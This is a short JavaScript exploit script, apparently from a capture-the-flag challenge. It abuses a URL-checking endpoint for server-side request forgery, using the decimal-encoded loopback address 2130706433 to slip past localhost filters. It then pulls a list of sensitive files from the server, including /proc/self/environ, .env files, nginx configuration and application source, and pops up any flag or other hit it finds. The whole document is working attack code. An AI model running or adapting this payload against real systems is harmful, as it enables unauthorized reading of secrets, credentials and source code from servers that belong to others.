// XMLHttpRequest sincrono - no necesita fetch ni iframe
function ssrf(path) {
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/check?url=' + encodeURIComponent('http://2130706433' + path), false);
    xhr.send(null);
    return xhr.responseText;
  } catch(e) {
    return 'ERROR: ' + e;
  }
}

function parseBody(xml) {
  var m = xml.match(/<body>([\s\S]*?)<\/body>/);
  if (!m) return xml;
  return m[1]
    .replace(/&amp;/g,'&')
    .replace(/&lt;/g,'<')
    .replace(/&gt;/g,'>')
    .replace(/&apos;/g,"'")
    .replace(/&quot;/g,'"');
}

var paths = [
  '/flag.txt',
  '/flag',
  '/proc/self/environ',
  '/proc/self/cmdline',
  '/etc/nginx/nginx.conf',
  '/etc/nginx/sites-enabled/default',
  '/etc/nginx/conf.d/default.conf',
  '/app/app.py',
  '/app/main.py',
  '/app/server.py',
  '/app/.env',
  '/.env',
  '/app/flag.txt',
  '/tmp/flag.txt',
  '/root/flag.txt',
];

var out = '=== SSRF Results ===\n\n';

paths.forEach(function(path) {
  var raw = ssrf(path);
  var body = parseBody(raw);
  
  if (body.includes('HCRD{')) {
    alert('🚩 FLAG: ' + body);
    out += '🚩 FLAG [' + path + ']: ' + body + '\n\n';
  } else if (
    !body.includes('Connection refused') && 
    !body.includes('not allowed') && 
    !body.includes('404') &&
    !body.includes('403') &&
    body.length > 10
  ) {
    out += '✅ HIT [' + path + ']:\n' + body.substring(0, 500) + '\n\n';
  } else {
    out += '❌ [' + path + ']\n';
  }
});

alert(out);